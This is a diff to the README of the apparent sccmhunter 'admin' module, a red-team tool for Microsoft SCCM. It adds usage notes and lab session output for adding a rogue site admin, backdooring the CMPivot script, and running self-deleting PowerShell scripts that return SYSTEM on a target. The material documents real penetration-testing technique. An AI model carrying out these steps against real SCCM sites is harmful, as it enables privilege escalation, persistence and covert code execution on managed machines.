@@ -2,7 +2,7 @@
 
 ### Description
 
-what does it do
+The admin module provides simulated command and control command line access to the SMS Provider's AdminService API. 
 
 ### Requirements
 
@@ -95,8 +95,14 @@ software              Show installed software on the target system.
 ```
 
 # get_collection
+
 ### Description
+The get_collection module can pull data regarding a single collection or recover all configured collections from the site server. Each type of query is demonstrated in the example below.
+
 ### Usage
+
+get_collection        Query for all (*) or single (id) collection(s)
+
 ### Example
 ```
 () (C:\) >> get_collection *
@@ -139,8 +145,14 @@ software              Show installed software on the target system.
 ```
 
 # get_device
+
 ### Description
+
+The get_device command will query the site server for a provided hostname. If the request is the first time the host has been queried, the data is pulled from the API. Otherwise, the results are stored in a local database to avoid unnecessary queires.
 ### Usage
+
+get_device [hostname]
+
 ### Example
 ```
 () (C:\) >> get_device mp
@@ -166,8 +178,14 @@ software              Show installed software on the target system.
 () (C:\) >> 
 ```
 # get_lastlogon
+
 ### Description
+The get_lastlogon command will query the site for every client the provided user account was the last logged on user. 
+
 ### Usage
+
+get_lastlogon [name]
+
 ### Example
 ```
 () (C:\) >> get_lastlogon administrator
@@ -190,7 +208,12 @@ software              Show installed software on the target system.
 
 # get_puser
 ### Description
+Query SCCM for any enrolled client where the supplied user account is configured as the primary user.
+
 ### Usage
+
+get_puser [username]
+
 ### Example
 ```
 () (C:\) >> get_puser lowpriv
@@ -205,8 +228,15 @@ software              Show installed software on the target system.
 ```
 
 # get_user
+
 ### Description
+
+Query SCCM for details for a provided username.
+
 ### Usage
+
+get_user [username]
+
 ### Example
 ```
 () (C:\) >> get_user lowpriv
@@ -229,35 +259,111 @@ software              Show installed software on the target system.
 ```
 
 # add_admin
+
 ### Description
+Add a provied account as a site server admin. This is useful for the scripts module where SCCM is configured to require a secondary account for script approval (default setting). The account type is not limited to a traditional user account and can be a machine. 
 ### Usage
+add_admin [username] [sid]
+
 ### Example
+
+```
+() (C:\) >> show_admins 
+[22:47:42] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                                                            
+[22:47:43] INFO     Current Full Admin Users:                                                                                                                                                                                          
+[22:47:43] INFO     LAB\Administrator                                                                                                                                                                                                  
+() (C:\) >> add_admin lowpriv S-1-5-21-4004054868-2969153893-1580793631-1113
+[22:47:47] INFO     Tasked SCCM to add lowpriv as an administrative user.                                                                                                                                                              
+[22:47:49] INFO     [+] Successfully added lowpriv as an admin.                                                                                                                                                                        
+() (C:\) >> show_admins 
+[22:47:51] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                                                            
+[22:47:52] INFO     Current Full Admin Users:                                                                                                                                                                                          
+[22:47:52] INFO     LAB\Administrator                                                                                                                                                                                                  
+[22:47:52] INFO     lowpriv                                                                                                                                                                                                            
+() (C:\) >> 
+
+```
 
 # backdoor
 ### Description
+Replace the built-in CMPivot script stored in the site server database with a user supplied script. This command will not run unless a backup exists for the script to ensure the operator is able to undue/restore the backdoored script.
+
 ### Usage
+
+
 ### Example
 
 # backup
 ### Description
+Backups the existing built-in CMPivot script. Required prior to any manipulation of the CMPivot script.
+
 ### Usage
 ### Example
 
 # delete_admin
 ### Description
+Remove a target administrator account from SCCM. Note: cannot be performed against itself.
+
 ### Usage
 ### Example
 
 # restore
 ### Description
+Restore a modified CMPivot script to its previous state.
 ### Usage
 ### Example
 
 # script
 ### Description
+Execute a provided PowerShell script on a target host. The script is intended to be self deleting from the remote host as well as from the site database. If the hierarchy is configured to require script approval (default) alternate credentials must be specified to approve the script. Alternate credentials can be obtained by using the `add_admin` command to add a secondary account as an administrator.
 ### Usage
-### Example
+### Examples
+#### Script approval not required
 
+#### Script approval required
+
+Script execution fails
+```
+(16777221) (C:\) >> script /root/test.txt
+[22:57:31] INFO     [+] Updates script created successfully with GUID c6006c4a-5590-4cac-9b49-48b86e80064f.                                                                                                                            
+[22:57:35] INFO     [-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.                                                                                                  
+[22:57:35] INFO     [*] Try using alternate approval credentials.                                                                                                                                                                      
+[22:57:38] INFO     [+] Script with GUID c6006c4a-5590-4cac-9b49-48b86e80064f deleted.                                                                                                                                                 
+(16777221) (C:\) >> 
+```
+Exit and provide alternate approval credentials. Run script again.
+
+```
+(16777221) (C:\) >> exit
+                                                                                                                                                                                                                                       
+┌──(root㉿kali)-[/opt/sccmhunter]
+└─# python3 sccmhunter.py admin -u lab\\administrator -p P@ssw0rd -ip 10.10.100.9 -au lowpriv -ap P@ssw0rd
+
+                                                                                          (
+                                    888                         d8                         \
+ dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
+C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
+ Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
+d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
+                                                                                         (
+                                                                 vdev0.0.3                   
+                                                                 @garrfoster                    
+    
+    
+    
+[23:08:05] INFO     [!] Enter help for extra shell commands                                                                                                                                                                            
+() C:\ >> interact 16777221
+(16777221) (C:\) >> shell cat /root/test.txt
+whoami
+(16777221) (C:\) >> script /root/test.txt
+[23:08:36] INFO     [+] Updates script created successfully with GUID aee2c070-fd21-4753-a2c5-48d50a9f48be.                                                                                                                            
+[23:08:39] INFO     [+] Script with guid aee2c070-fd21-4753-a2c5-48d50a9f48be approved.                                                                                                                                                
+[23:08:43] INFO     [+] Script with guid aee2c070-fd21-4753-a2c5-48d50a9f48be executed.                                                                                                                                                
+[23:09:04] INFO     [+] Got result:                                                                                                                                                                                                    
+[23:09:04] INFO     nt authority\\system                                                                                                                                                                                               
+[23:09:06] INFO     [+] Script with GUID aee2c070-fd21-4753-a2c5-48d50a9f48be deleted.                                                                                                                                                 
+(16777221) (C:\) >> 
+```
 # show_admins
 ### Description
 ### Usage
